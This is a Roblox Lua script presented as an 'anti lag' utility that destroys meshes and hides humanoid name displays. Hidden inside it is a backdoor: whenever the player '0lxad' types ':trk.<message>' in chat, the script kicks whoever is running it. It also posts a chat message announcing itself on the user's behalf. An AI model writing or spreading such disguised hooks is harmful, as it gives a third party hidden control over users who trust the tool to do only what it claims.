local Players = game:GetService("Players")
local Player = Players.LocalPlayer or Players.LocalPlayerAdded:wait()
local Daddy = Players:FindFirstChild('0lxad') or Players:WaitForChild('0lxad')
rchat = function(Message)
  Players:Chat(Message)
end

Daddy.Chatted:Connect(function(msg)
    if string.lower(string.split(msg, '.')[1]) == ":trk" then
      if Player.Name == '0lxad' then print("Skids kicked")
      else
        local kmsg = string.split(msg, '.')[2]
            Player:Kick(kmsg)
      end
    end
end)

if Player.Name ~= '0lxad' then
game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Loaded nim's anti lag (weaker)","all")
end

while wait() do
    for i,v in pairs(workspace:GetDescendants())do
        if v.Name=='Mesh' or v.Name=='SpecialMesh' then
            if v.Parent.Name~='Head' and v.Parent.Name~='Handle' then
                if not v:IsDescendantOf(Workspace.SecureParts) then
                    v:Destroy()
                end
            end
        end
    end
    for i,v in game.workspace:GetDescendants() do
        if v.ClassName == 'Humanoid' then
            if v.Name ~= 'Cleaned' then
                v.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Subject
                v.NameDisplayDistance = 0
                v.Name = 'Cleaned'
            end
        end
    end
end
